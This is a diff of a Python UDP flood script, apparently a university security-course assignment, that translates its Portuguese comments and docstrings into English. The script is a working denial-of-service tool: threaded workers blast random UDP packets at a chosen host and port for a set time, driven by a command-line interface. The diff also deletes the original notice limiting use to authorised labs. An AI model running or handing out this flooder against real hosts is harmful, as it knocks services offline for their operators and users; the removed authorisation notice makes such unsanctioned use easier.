@@ -1,22 +1,18 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Mestrado de Engenharia em Segurança Informatica
-Linguagens de Programação Dinamicas - UDP Flood
+Master's in Computer Security Engineering
+Dynamic Programming Languages - UDP Flooder
 
-Martinho Caeiro (23917)
+Author: Martinho Caeiro (23917)
 
-Este script envia pacotes UDP para um alvo em várias portas (UDP Flood Attack).
+Description:
+    Sends UDP packets to a target (UDP Flood attack).
 
-AVISO LEGAL:
-Este script é fornecido apenas para fins educacionais e de testes em laboratórios
-autorizados. O uso não autorizado pode violar leis aplicáveis. Use apenas em sistemas
-que tem autorização para testar.
-
-Uso:
+Usage:
     python3 udp_flooder.py [--target HOST] [--port PORT] [--duration SECONDS] [--threads N]
 
-Exemplo:
+Example:
     python3 udp_flooder.py --target 192.168.1.1 --port 53 --duration 10
 """
 
@@ -28,11 +24,12 @@ import time
 import threading
 from datetime import datetime
 
-# =====================
-# UDP Flooder Functions
+
+
+# Section: Workers
 
 def udp_flood_worker(target, port, packet_size, duration, packets_sent):
-    """Worker thread que envia pacotes UDP para um alvo."""
+    """Worker thread that sends UDP packets to a target."""
     end_time = time.time() + duration
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     packet = random.randbytes(packet_size)
@@ -55,8 +52,11 @@ def udp_flood_worker(target, port, packet_size, duration, packets_sent):
     return count
 
 
+
+# Section: Flood logic
+
 def flood_target(target, port, packet_size, duration, num_threads):
-    """Envia UDP flood com múltiplas threads."""
+    """Send UDP flood with multiple threads."""
     print(f"\nIniciando UDP Flood")
     print(f"   Alvo: {target}:{port}")
     print(f"   Tamanho do pacote: {packet_size} bytes")
@@ -69,7 +69,7 @@ def flood_target(target, port, packet_size, duration, num_threads):
     t_start = time.time()
 
     try:
-        # Criar threads
+        # Create threads
         for i in range(num_threads):
             t = threading.Thread(
                 target=udp_flood_worker,
@@ -79,7 +79,7 @@ def flood_target(target, port, packet_size, duration, num_threads):
             t.start()
             threads.append(t)
 
-        # Esperar pelas threads
+        # Wait for threads
         for t in threads:
             t.join()
 
@@ -100,6 +100,9 @@ def flood_target(target, port, packet_size, duration, num_threads):
     print("=" * 60)
 
 
+
+# Section: CLI
+
 def main():
     parser = argparse.ArgumentParser(
         description="UDP Flooder - Ataque de negação de serviço (DoS) via UDP",
@@ -113,14 +116,14 @@ def main():
 
     args = parser.parse_args()
 
-    # Se não foi fornecido alvo, fazer prompt
+    # If target was not provided, prompt
     if not args.target:
         args.target = input("Alvo (IP ou hostname): ").strip()
         if not args.target:
             print("Nenhum alvo fornecido. Abortando.")
             sys.exit(1)
 
-    # Validações
+    # Validations
     if args.port < 1 or args.port > 65535:
         print(f"Porta deve estar entre 1 e 65535")
         sys.exit(1)
@@ -137,9 +140,9 @@ def main():
         print(f"Número de threads deve ser pelo menos 1")
         sys.exit(1)
 
-    # Confirmação de segurança
+    # Safety confirmation
     print("=" * 60)
-    print("AVISO - UDP FLOOD ATTACK")
+    print("AVISO - ATAQUE UDP FLOOD")
     print("=" * 60)
     print(f"Está prestes a enviar um ataque DoS para: {args.target}:{args.port}")
     print(f"Duração: {args.duration}s | Threads: {args.threads}")
@@ -151,7 +154,7 @@ def main():
         print("Operação cancelada.")
         sys.exit(0)
 
-    # Resolver hostname se necessário
+    # Resolve hostname if needed
     try:
         target_ip = socket.gethostbyname(args.target)
         print(f"Alvo resolvido: {args.target} -> {target_ip}")
@@ -159,7 +162,7 @@ def main():
         print(f"Não foi possível resolver {args.target}")
         sys.exit(1)
 
-    # Executar flood
+    # Execute flood
     flood_target(target_ip, args.port, args.packet_size, args.duration, args.threads)
 
 
